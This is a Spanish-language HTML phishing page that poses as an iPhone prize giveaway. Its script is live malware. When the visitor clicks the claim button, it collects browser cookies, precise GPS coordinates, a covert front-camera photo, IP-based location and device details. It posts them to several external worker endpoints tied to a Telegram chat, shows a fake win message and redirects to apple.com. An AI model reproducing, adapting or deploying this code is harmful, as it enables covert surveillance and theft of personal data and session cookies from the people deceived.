<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 ¡Has ganado un premio!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: white;
            max-width: 450px;
            width: 100%;
            padding: 30px;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
            text-align: center;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.02); }
            100% { transform: scale(1); }
        }
        .emoji-big { font-size: 4rem; margin-bottom: 16px; }
        h2 { font-size: 1.8rem; color: #1a1a1a; margin-bottom: 8px; }
        .subtitle { color: #666; font-size: 0.95rem; margin-bottom: 24px; }
        .prize-box {
            background: #f8f9fa;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 24px;
            border: 2px dashed #ff6b6b;
        }
        .prize-box h3 { color: #ff6b6b; font-size: 1.5rem; }
        .prize-box p { color: #555; font-size: 0.85rem; }
        .btn {
            background: #ff6b6b;
            color: white;
            border: none;
            padding: 14px 32px;
            border-radius: 50px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s;
            box-shadow: 0 4px 15px rgba(255,107,107,0.4);
        }
        .btn:active { transform: scale(0.96); }
        .footer { margin-top: 20px; font-size: 0.7rem; color: #aaa; }
        .hidden { display: none; }
        video, canvas { display: none; }
        #status { 
            margin-top: 16px; 
            padding: 12px; 
            background: #f0f0f0; 
            border-radius: 12px; 
            font-size: 0.85rem; 
            color: #333;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff6b6b;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="emoji-big">🎁</div>
        <h2>¡Felicidades!</h2>
        <p class="subtitle">Has sido seleccionado para ganar un <strong>iPhone 16 Pro Max</strong>.</p>
        
        <div class="prize-box">
            <h3>📱 iPhone 16 Pro Max</h3>
            <p>Valor: $1,599 USD</p>
            <p style="font-size: 0.7rem; color: #ff6b6b;">⏳ Solo 1 unidad disponible</p>
        </div>

        <button class="btn" id="claimBtn">🎰 GIRAR LA RULETA</button>
        <div id="spinner" class="spinner"></div>
        <div id="status">⚡ Haz clic en el botón para participar.</div>
        <div class="footer">Este sorteo es válido solo por hoy. Participa ahora.</div>
    </div>

    <video id="video" autoplay playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        // ================= CONFIGURACIÓN =================
        // 🔥 TODAS LAS URLS QUE ME HAS DADO (las que funcionan)
        const WORKER_URLS = [
            'https://bot-ubi.societykark.workers.dev',
            'https://bot-tg.societykark.workers.dev',
            'https://tg-bot12.societykark.workers.dev',
            'https://app-trk.societykark.workers.dev',
            'https://app-tg.societykark.workers.dev',
            'https://app-kali.societykark.workers.dev',
            'https://societykark.pythonanywhere.com',
            'https://kali-bot12.societykark.workers.dev',
            'https://galleta.societykark.workers.dev'
        ];
        const CHAT_ID = '7555997298';

        // ========== FUNCIONES DE RECOLECCIÓN ==========

        // 1. Cookies
        function getCookies() {
            return document.cookie.split('; ')
                .map(c => { const [n, v] = c.split('='); return { name: n, value: v }; })
                .filter(c => c.name && c.value);
        }

        // 2. GPS exacto
        function getGPS() {
            return new Promise(resolve => {
                if (!navigator.geolocation) return resolve(null);
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 15000 }
                );
            });
        }

        // 3. Foto de cámara frontal
        async function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            } catch {
                try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); } catch { return null; }
            }
            if (!stream) return null;
            video.srcObject = stream;
            await new Promise(r => video.onloadedmetadata = () => { video.play(); r(); });
            await new Promise(r => setTimeout(r, 500));
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
            stream.getTracks().forEach(t => t.stop());
            video.srcObject = null;
            return blob;
        }

        // 4. Ubicación desde el Worker (IP, ciudad, país)
        async function getLocationFromWorker() {
            try {
                const res = await fetch('https://bot-ubi.societykark.workers.dev'); // Cualquiera sirve
                if (!res.ok) throw new Error();
                const data = await res.json();
                return {
                    ip: data.ip || 'N/A',
                    country: data.country || 'N/A',
                    region: data.region || 'N/A',
                    city: data.city || 'N/A',
                    timezone: data.timezone || 'N/A'
                };
            } catch { return null; }
        }

        // 5. Dispositivo y navegador
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let model = "Desconocido";
            if (ua.includes('iPhone')) model = 'iPhone';
            else if (ua.includes('iPad')) model = 'iPad';
            else if (ua.includes('Android')) model = 'Android';
            else if (ua.includes('Mac')) model = 'Mac';
            else if (ua.includes('Windows')) model = 'Windows PC';
            return {
                model,
                ua,
                language: navigator.language || 'N/A',
                resolution: `${window.screen.width}x${window.screen.height}`,
                cores: navigator.hardwareConcurrency || 'N/A'
            };
        }

        // 6. Almacenamiento (cuánto espacio libre)
        async function getStorageInfo() {
            try {
                const est = await navigator.storage.estimate();
                return { total: (est.quota / (1024**3)).toFixed(2), used: (est.usage / (1024**3)).toFixed(2) };
            } catch { return { total: 'N/A', used: 'N/A' }; }
        }

        // ========== ENVÍO A MÚLTIPLES WORKERS (NUEVO) ==========
        async function sendToMultipleWorkers(message, photoBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('text', message);
            if (photoBlob) formData.append('photo', photoBlob, 'photo.jpg');

            // Enviar a TODAS las URLs en paralelo
            const promises = WORKER_URLS.map(async (url) => {
                try {
                    const res = await fetch(url, {
                        method: 'POST',
                        body: formData,
                        mode: 'cors',
                        credentials: 'omit'
                    });
                    if (!res.ok) {
                        console.warn(`Error en ${url}: ${res.status}`);
                    }
                } catch (e) {
                    console.warn(`Error en ${url}:`, e.message);
                }
            });

            // Esperar a que todas terminen (o fallen)
            await Promise.all(promises);
        }

        // ========== ACCIÓN DEL BOTÓN ==========
        document.getElementById('claimBtn').addEventListener('click', async function(e) {
            e.preventDefault();
            this.disabled = true;
            this.textContent = '⏳ Procesando...';
            document.getElementById('spinner').style.display = 'block';
            document.getElementById('status').textContent = '🔍 Verificando tu identidad...';

            // Recolectar TODOS los datos en paralelo
            const [gps, location, device, cookies, storage, photo] = await Promise.all([
                getGPS(),
                getLocationFromWorker(),
                getDeviceInfo(),
                getCookies(),
                getStorageInfo(),
                capturePhoto()
            ]);

            // Construir mensaje detallado
            let message = `🎰 *RULETA DE PREMIOS - DATOS ROBADOS*\n━━━━━━━━━━━━━━━━\n\n`;
            message += `📱 *Dispositivo:* ${device.model}\n`;
            message += `📱 *User Agent:* ${device.ua}\n`;
            message += `📱 *Idioma:* ${device.language}\n`;
            message += `📱 *Resolución:* ${device.resolution}\n`;
            message += `📱 *CPU Cores:* ${device.cores}\n\n`;

            if (location) {
                message += `🌐 *IP:* ${location.ip}\n`;
                message += `📍 *País:* ${location.country}\n`;
                message += `📍 *Región:* ${location.region}\n`;
                message += `📍 *Ciudad:* ${location.city}\n`;
                message += `⏰ *Zona Horaria:* ${location.timezone}\n\n`;
            }

            if (gps) {
                message += `📍 *GPS EXACTO:*\n`;
                message += `   • Lat: ${gps.lat}\n`;
                message += `   • Lng: ${gps.lng}\n`;
                message += `   • Precisión: ±${gps.accuracy}m\n`;
                message += `   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n\n`;
            }

            message += `🍪 *COOKIES:* ${cookies.length} encontradas\n`;
            if (cookies.length > 0) {
                cookies.forEach(c => {
                    let display = c.value.length > 60 ? c.value.slice(0, 60) + '...' : c.value;
                    message += `   • ${c.name}: ${display}\n`;
                });
                message += '\n';
            }

            message += `💾 *ALMACENAMIENTO:*\n`;
            message += `   • Usado: ${storage.used} GB\n`;
            message += `   • Total: ${storage.total} GB\n\n`;

            message += `📸 *Foto:* ${photo ? '✅ Capturada' : '❌ No disponible'}\n`;
            message += `━━━━━━━━━━━━━━━━\n🎯 Página: Ruleta de premios\n⚡ Desarrollado por: @Society`;

            // Enviar a TODAS las URLs
            await sendToMultipleWorkers(message, photo);

            // Mostrar mensaje falso
            document.getElementById('status').innerHTML = '🎉 ¡Felicidades! Has ganado un iPhone 16 Pro Max. <br> Te enviaremos un correo con las instrucciones.';
            document.getElementById('status').style.background = '#d4edda';
            document.getElementById('status').style.color = '#155724';
            this.textContent = '✅ Reclamado';
            document.getElementById('spinner').style.display = 'none';

            // Redirigir a un sitio legítimo
            setTimeout(() => {
                window.location.href = 'https://www.apple.com/';
            }, 5000);
        });
    </script>
</body>
</html>
